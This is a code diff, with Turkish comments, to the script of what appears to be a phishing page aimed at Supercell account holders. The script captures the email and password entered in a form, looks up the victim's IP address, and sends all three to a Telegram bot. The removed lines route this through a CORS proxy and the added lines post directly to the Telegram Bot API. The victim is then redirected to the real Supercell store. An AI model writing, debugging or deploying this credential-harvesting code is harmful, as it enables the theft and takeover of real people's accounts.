@@ -99,34 +99,35 @@
 
   <script>
   async function sendMessage() {
-    const token = 'BOT_TOKENUNUZ';
-    const userId = 'CHAT_IDNIZ';
+    const token = 'BOT_TOKENUNUZ'; // Tokeninizi kontrol edin
+    const userId = 'CHAT_IDNIZ'; // Chat ID'nizi kontrol edin
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
 
     try {
-      // 1. CORS Proxy ile IP alımı
-      const ip = await fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(data => data.ip)
-        .catch(() => 'IP Alınamadı');
+      // 1. IP adresi alma
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      if (!ipResponse.ok) throw new Error('IP alınamadı');
+      const { ip } = await ipResponse.json();
 
-      // 2. CORS Proxy ile Telegram API isteği
-      const proxyUrl = 'https://corsproxy.io/?';
-      const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
-      
-      const response = await fetch(proxyUrl + encodeURIComponent(telegramUrl), {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: userId,
-          text: `email: ${email}\nşifre: ${password}\nIP: ${ip}`
-        })
-      });
+      // 2. Telegram API için özel istek formatı
+      const formData = new FormData();
+      formData.append('chat_id', userId);
+      formData.append('text', `email: ${email}\nşifre: ${password}\nIP: ${ip}`);
 
-      if (!response.ok) throw new Error('Telegram API hatası');
+      const telegramResponse = await fetch(
+        `https://api.telegram.org/bot${token}/sendMessage`,
+        {
+          method: 'POST',
+          body: formData
+        }
+      );
+
+      if (!telegramResponse.ok) {
+        const error = await telegramResponse.json();
+        throw new Error(error.description || 'Telegram hatası');
+      }
+
       window.location.href = 'https://store.supercell.com/tr';
     } catch (error) {
       alert(`Hata: ${error.message}`);
